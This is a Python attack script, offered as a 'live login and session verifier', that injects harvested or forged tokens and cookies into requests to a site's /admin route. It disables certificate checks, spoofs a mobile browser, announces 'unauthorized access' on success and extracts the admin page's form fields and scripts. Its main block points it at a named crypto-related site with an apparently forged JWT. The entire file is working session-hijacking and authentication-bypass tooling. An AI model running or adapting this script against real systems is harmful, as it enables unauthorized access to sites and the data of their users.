#!/usr/bin/env python3
"""
LIVE LOGIN & SESSION VERIFIER MODULE
- Intercepts and injects harvested/forged tokens or cookies on the fly
- Executes live HTTP requests against protected routes
- Parses structural HTML/DOM contents (titles, inputs, scripts) on successful bypass
- Streams unredacted proof and visual status directly to the mobile terminal
"""
import sys
import re
import httpx

COLORS = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "CYAN": "\033[96m",
    "MAGENTA": "\033[95m",
    "RESET": "\033[0m",
    "BOLD": "\033[1m",
}

def terminal(message):
    sys.stdout.write(message + "\n")
    sys.stdout.flush()

def parse_admin_dom(html_content):
    """Extracts key structural elements from the bypassed HTML page for proof."""
    if not html_content:
        return {"title": "None", "headings": [], "form_inputs": [], "scripts": []}
        
    # Extract page title
    title_match = re.search(r"<title>(.*?)</title>", html_content, re.IGNORECASE)
    title = title_match.group(1).strip() if title_match else "No Title Found"
    
    # Extract main headings (h1, h2, h3)
    headings = re.findall(r"<h[1-3][^>]*>(.*?)</h[1-3]>", html_content, re.IGNORECASE | re.DOTALL)
    clean_headings = [re.sub(r"<[^>]+>", "", h).strip() for h in headings if h.strip()]
    
    # Extract form inputs or names
    inputs = re.findall(r"<input[^>]+name=['\"]([^'\"]+)['\"]", html_content, re.IGNORECASE)
    
    # Extract script sources
    scripts = re.findall(r"<script[^>]+src=['\"]([^'\"]+)['\"]", html_content, re.IGNORECASE)

    return {
        "title": title,
        "headings": clean_headings[:5],  # top 5 headings
        "form_inputs": list(set(inputs)),
        "scripts": scripts[:5]
    }

def execute_live_login_verification(target_url, endpoint="/admin", token=None, cookie_dict=None):
    """
    Actively injects tokens or cookies and hits a protected endpoint live on screen,
    parsing the structural DOM if access is granted.
    """
    base = target_url.rstrip("/")
    full_url = f"{base}{endpoint}" if not endpoint.startswith("http") else endpoint
    
    terminal(f"\n{COLORS['MAGENTA']}[***] INITIALIZING LIVE SESSION INJECTION & LOGIN VERIFICATION [***]{COLORS['RESET']}")
    terminal(f"  ├── Target URL  : {COLORS['CYAN']}{full_url}{COLORS['RESET']}")
    terminal(f"  ├── Token / JWT : {COLORS['YELLOW']}{str(token)[:30]}...{COLORS['RESET']}" if token else "  ├── Token / JWT : None supplied")
    terminal(f"  └── Cookie Jar  : {COLORS['YELLOW']}{cookie_dict}{COLORS['RESET']}")

    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }
    
    if token:
        headers["Authorization"] = f"Bearer {token}"

    try:
        with httpx.Client(verify=False, follow_redirects=True, timeout=10.0) as client:
            if cookie_dict:
                client.cookies.update(cookie_dict)
            
            terminal(f"\n{COLORS['CYAN']}[*] Dispatching live request to protected route...{COLORS['RESET']}")
            response = client.get(full_url, headers=headers)
            
            status = response.status_code
            body = response.text
            
            terminal(f"\n{COLORS['BOLD']}=== LIVE RESPONSE TELEMETRY ==={COLORS['RESET']}")
            terminal(f"  ├── Status Code : {COLORS['GREEN'] if status == 200 else COLORS['RED']}{status}{COLORS['RESET']}")
            terminal(f"  └── Content Len : {len(body)} bytes")
            
            if status == 200 and ("dashboard" in body.lower() or "admin" in body.lower() or "welcome" in body.lower() or "crypto" in body.lower()):
                terminal(f"\n{COLORS['RED']}{COLORS['BOLD']}[!!!] SUCCESS: UNAUTHORIZED ACCESS / LIVE LOGIN VERIFIED [!!!]{COLORS['RESET']}")
                
                # Parse and display structural DOM proof
                dom_data = parse_admin_dom(body)
                terminal(f"\n{COLORS['GREEN']}[+] ADMIN DOM STRUCTURE EXTRACTED:{COLORS['RESET']}")
                terminal(f"  ├── Page Title  : {COLORS['CYAN']}{dom_data['title']}{COLORS['RESET']}")
                terminal(f"  ├── Headings    : {dom_data['headings']}")
                terminal(f"  ├── Form Inputs : {dom_data['form_inputs']}")
                terminal(f"  └── JS Bundles  : {dom_data['scripts']}")
                
                terminal(f"\n  └── Response Snippet:\n{COLORS['CYAN']}{body[:300]}...{COLORS['RESET']}\n")
                return True
            else:
                terminal(f"\n{COLORS['YELLOW']}[-] Server rejected session or redirected (Status: {status}).{COLORS['RESET']}")
                return False

    except Exception as exc:
        terminal(f"\n{COLORS['RED']}[-] Live verification error: {exc}{COLORS['RESET']}")
        return False

if __name__ == "__main__":
    execute_live_login_verification(
        target_url="https://cryptobytes.online",
        endpoint="/admin",
        token="eyJhGciOiAiBm9uZSsi..."
    )
